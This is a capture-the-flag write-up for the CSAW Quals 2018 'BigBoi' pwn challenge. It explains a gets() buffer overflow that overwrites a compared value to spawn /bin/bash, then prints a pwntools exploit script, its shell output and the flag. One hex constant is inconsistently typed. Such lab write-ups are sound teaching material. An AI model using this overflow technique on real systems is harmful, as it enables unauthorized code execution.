# BigBoi

## Information:

CTF: CSAW Quals 2018
Category: PWN
Point Value: 25
Challenge Author: github.com/Helithumper

## Challenge Description

```bash
    bigboy
    Category: Pwn Points: 25 Solved: 656 Description:

    Only big boi pwners will get this one!

    nc pwn.chal.csaw.io 9000
```

We were given an ELF to work with. First thing I did was run `file` on it:
```bash
    boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
    interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
```
So we were dealing with a 64 bit ELF.

Upon running, I found the following:
```bash
    ➜  boi ./boi
    Are you a big boiiiii??
    yes
    Wed Sep 19 04:27:55 UTC 2018
```
So when we give it text, it gives us the current time UTC... hmm

Disassembler time!

![Binary Ninja Disassembly](https://github.com/HackUCF/ctfs/raw/csaw_quals_bigboi/2018-2019/csaw_quals_2018/pwn/bigboi_25/images/bigboi1.png)

So what we see is that a conditional is run after `read` is called to compare `eax` with `0xcaf3baee`. If our value is not equal to `0xcad3baee`, then `/bin/date` is run. Else `/bin/bash` is run. You can guess which path of execution we want...

So from what I can see here i'm betting it's a buffer overflow given that `gets` is used. `gets` doesn't check for buffer sizes and is thus extremely volatile. If I name both the variable that `gets` puts our input into as well as the variable being compared to `0xcaf3baee` in Binja, then we can see offsets:

![Stack Overview](https://github.com/HackUCF/ctfs/raw/csaw_quals_bigboi/2018-2019/csaw_quals_2018/pwn/bigboi_25/images/bigboi2.png)

So we know that there is a difference of:

    0x38-0x28 = 16 Bytes

between our variables. The difference we see, however, is that our variable is actually at that offset `+0x4`.
![+0x4](https://github.com/HackUCF/ctfs/raw/csaw_quals_bigboi/2018-2019/csaw_quals_2018/pwn/bigboi_25/images/bigboi3.png)
So we add 4 to 16 Bytes and we get an offset of 20 Bytes.

With this knowledge, we can then create our payload:
```python
    from pwn import *


    p = remote('pwn.chal.csaw.io',9000)

    print(p.recvline())

    payload = 'A'*20 + p64(0xCAF3BAEE)

    # gdb.attach(p)

    print(payload)
    p.sendline(payload)


    p.interactive()
```
When run, we get the following:
```bash
    me@mycomputer ~/D/c/c/boi> python exploit.py
    [+] Opening connection to pwn.chal.csaw.io on port 9000: Done
     _    ___        ____   ___  _ _ _ _

    AAAAAAAAAAAAAAAAAAAA���\x00\x00\x00
    [*] Switching to interactive mode
    | |__|_ _|__ _  | __ ) / _ \(_|_|_|_)
    | '_ \| |/ _` | |  _ \| | | | | | | |
    | |_) | | (_| | | |_) | |_| | | | | |
    |_.__/___\__, | |____/ \___/|_|_|_|_|
             |___/
    ***************************************
    Are you a big boiiiii??
    AAAAAAAAAAAAAAAAAAAA���^@^@^@^@
    $ ls
    ls
    art.txt  boi  flag.txt    run.sh
    $ cat flag.txt
    cat flag.txt
    flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
    $
```
So yay. Shell and flag